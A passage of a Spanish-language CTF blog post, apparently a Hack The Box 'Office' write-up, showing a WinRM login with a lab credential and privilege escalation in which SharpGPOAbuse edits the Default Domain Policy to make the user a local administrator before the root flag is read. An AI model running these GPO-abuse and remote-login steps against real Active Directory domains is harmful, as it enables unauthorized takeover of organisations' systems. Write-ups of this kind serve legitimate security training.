+❯ cme winrm office.htb <span class="nt">-u</span> <span class="s1">'hhogan'</span> <span class="nt">-p</span> <span class="s1">'H4ppyFtW183#'</span>
+SMB         office.htb      5985   DC               <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows Server 2022 Build 20348 <span class="o">(</span>name:DC<span class="o">)</span> <span class="o">(</span>domain:office.htb<span class="o">)</span>
+HTTP        office.htb      5985   DC               <span class="o">[</span><span class="k">*</span><span class="o">]</span> http://office.htb:5985/wsman
+WINRM       office.htb      5985   DC               <span class="o">[</span>+] office.htb<span class="se">\h</span>hogan:H4ppyFtW183# <span class="o">(</span>Pwn3d!<span class="o">)</span>
+</code></pre></div></div>
+
+<h2 id="escalada-de-privilegios">Escalada de Privilegios</h2>
+
+<ul>
+  <li>Estamos en el grupo GPO Managers <a href="https://learn.microsoft.com/es-es/windows-server/identity/ad-ds/manage/group-policy/group-policy-management-console">https://learn.microsoft.com/es-es/windows-server/identity/ad-ds/manage/group-policy/group-policy-management-console</a>.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\H</span>Hogan<span class="se">\D</span>ocuments&gt; net user hhogan
+User name                    HHogan
+Full Name
+Comment
+User<span class="s1">'s comment
+Country/region code          000 (System Default)
+Account active               Yes
+Account expires              Never
+
+Password last set            5/6/2023 11:59:34 AM
+Password expires             Never
+Password changeable          5/7/2023 11:59:34 AM
+Password required            Yes
+User may change password     Yes
+
+Workstations allowed         All
+Logon script
+User profile
+Home directory
+Last logon                   5/10/2023 5:30:58 AM
+
+Logon hours allowed          All
+
+Local Group Memberships      *Remote Management Use
+Global Group memberships     *Domain Users         *GPO Managers
+The command completed successfully.
+</span></code></pre></div></div>
+
+<ul>
+  <li>Podemos ver los GPOs.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\H</span>Hogan<span class="se">\D</span>ocuments&gt; Get-GPO <span class="nt">-All</span> | Select-Object DisplayName
+
+DisplayName
+<span class="nt">-----------</span>
+Windows Firewall GPO
+Default Domain Policy
+Default Active Directory Settings GPO
+Default Domain Controllers Policy
+Windows Update GPO
+Windows Update Domain Policy
+Software Installation GPO
+Password Policy GPO
+</code></pre></div></div>
+
+<ul>
+  <li>
+    <p>Como el usuario esta en ese grupo puedes editarlos los Group Policy Objects son políticas que Windows utiliza para gestionar computadoras en una red podemos usar esta herramienta <a href="https://github.com/FSecureLABS/SharpGPOAbuse">https://github.com/FSecureLABS/SharpGPOAbuse</a>.</p>
+  </li>
+  <li>
+    <p>Vamos añadir al usuario actual al grupo de los administradores.</p>
+  </li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\H</span>Hogan<span class="se">\D</span>ocuments&gt; .<span class="se">\S</span>harpGPOAbuse.exe <span class="nt">--AddLocalAdmin</span> <span class="nt">--GPOName</span> <span class="s2">"Default Domain Policy"</span> <span class="nt">--UserAccount</span> <span class="s2">"OFFICE</span><span class="se">\h</span><span class="s2">hogan"</span>
+<span class="o">[</span>+] Domain <span class="o">=</span> office.htb
+<span class="o">[</span>+] Domain Controller <span class="o">=</span> DC.office.htb
+<span class="o">[</span>+] Distinguished Name <span class="o">=</span> <span class="nv">CN</span><span class="o">=</span>Policies,CN<span class="o">=</span>System,DC<span class="o">=</span>office,DC<span class="o">=</span>htb
+<span class="o">[</span>+] SID Value of OFFICE<span class="se">\h</span>hogan <span class="o">=</span> S-1-5-21-1199398058-4196589450-691661856-1108
+<span class="o">[</span>+] GUID of <span class="s2">"Default Domain Policy"</span> is: <span class="o">{</span>31B2F340-016D-11D2-945F-00C04FB984F9<span class="o">}</span>
+<span class="o">[</span>+] File exists: <span class="se">\\</span>office.htb<span class="se">\S</span>ysVol<span class="se">\o</span>ffice.htb<span class="se">\P</span>olicies<span class="se">\{</span>31B2F340-016D-11D2-945F-00C04FB984F9<span class="o">}</span><span class="se">\M</span>achine<span class="se">\M</span>icrosoft<span class="se">\W</span>indows NT<span class="se">\S</span>ecEdit<span class="se">\G</span>ptTmpl.inf
+<span class="o">[</span>+] The GPO does not specify any group memberships.
+<span class="o">[</span>+] versionNumber attribute changed successfully
+<span class="o">[</span>+] The version number <span class="k">in </span>GPT.ini was increased successfully.
+<span class="o">[</span>+] The GPO was modified to include a new <span class="nb">local </span>admin. Wait <span class="k">for </span>the GPO refresh cycle.
+<span class="o">[</span>+] Done!
+
+<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\H</span>Hogan<span class="se">\D</span>ocuments&gt; gpupdate /force
+Updating policy...
+
+
+
+Computer Policy update has completed successfully.
+
+User Policy update has completed successfully.
+</code></pre></div></div>
+
+<ul>
+  <li>Ahora comprobamos que estamos dentro.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\H</span>Hogan<span class="se">\D</span>ocuments&gt; net user hhogan
+User name                    HHogan
+Full Name
+Comment
+User<span class="s1">'s comment
+Country/region code          000 (System Default)
+Account active               Yes
+Account expires              Never
+
+Password last set            5/6/2023 11:59:34 AM
+Password expires             Never
+Password changeable          5/7/2023 11:59:34 AM
+Password required            Yes
+User may change password     Yes
+
+Workstations allowed         All
+Logon script
+User profile
+Home directory
+Last logon                   5/10/2023 5:30:58 AM
+
+Logon hours allowed          All
+
+Local Group Memberships      *Administrators       *Remote Management Use
+Global Group memberships     *Domain Users         *GPO Managers
+The command completed successfully.
+</span></code></pre></div></div>
+
+<ul>
+  <li>Si nos volvemos a conectar ya podemos ver la flag.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ evil-winrm <span class="nt">-i</span> office.htb <span class="nt">-u</span> <span class="s1">'hhogan'</span> <span class="nt">-p</span> <span class="s1">'H4ppyFtW183#'</span>
+
+Evil-WinRM shell v3.5
+
+Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc<span class="o">()</span> <span class="k">function </span>is unimplemented on this machine
+
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+
+Info: Establishing connection to remote endpoint
+<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\H</span>Hogan<span class="se">\D</span>ocuments&gt; <span class="nb">type </span>C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>esktop<span class="se">\r</span>oot.txt
+a765138dbb01ba1b3773f22129fe1f3a
+<span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\U</span>sers<span class="se">\H</span>Hogan<span class="se">\D</span>ocuments&gt;
+</code></pre></div></div>
+
+  </div><a class="u-url" href="/hackthebox/machines/hard/2024/07/19/office.html" hidden></a>
+</article>
+
+      </div>
+    </main><footer class="site-footer h-card">
+  <data class="u-url" href="/"></data>
+
+  <div class="wrapper">
+
+    <div class="footer-col-wrapper">
+      <div class="footer-col">
+        <p class="feed-subscribe">
+          <a href="http://localhost:4000/feed.xml">
+            <svg class="svg-icon orange">
+              <use xlink:href="/assets/minima-social-icons.svg#rss"></use>
+            </svg><span>Subscribe</span>
+          </a>
+        </p>
+        <ul class="contact-list">
+          <li class="p-name">MiguelRega7</li>
+          
+        </ul>
+      </div>
+      <div class="footer-col">
+        <p>Posts sobre resolución de CTFs y ciberseguridad.
+</p>
+      </div>
+    </div>
+
+    <div class="social-links"><ul class="social-media-list"><li>
+  <a rel="me" href="https://github.com/MikeRega7" target="_blank" title="github">
+    <svg class="svg-icon grey">
+      <use xlink:href="/assets/minima-social-icons.svg#github"></use>
+    </svg>
+  </a>
+</li>
+<li>
+  <a rel="me" href="https://www.instagram.com/_miguelitoregn7" target="_blank" title="instagram">
+    <svg class="svg-icon grey">
+      <use xlink:href="/assets/minima-social-icons.svg#instagram"></use>
+    </svg>
+  </a>
+</li>
+<li>
+  <a rel="me" href="https://www.linkedin.com/in/juan-miguel-regalado-nu%C3%B1o-a3b14b278" target="_blank" title="linkedin">
+    <svg class="svg-icon grey">
+      <use xlink:href="/assets/minima-social-icons.svg#linkedin"></use>
+    </svg>
+  </a>
+</li>
+<li>
+  <a rel="me" href="https://twitter.com/MiguelJmrn7" target="_blank" title="twitter">
+    <svg class="svg-icon grey">
+      <use xlink:href="/assets/minima-social-icons.svg#twitter"></use>
+    </svg>
+  </a>
+</li>
+</ul>
+</div>
+
+  </div>
+
+</footer>
+</body>
+
+</html>
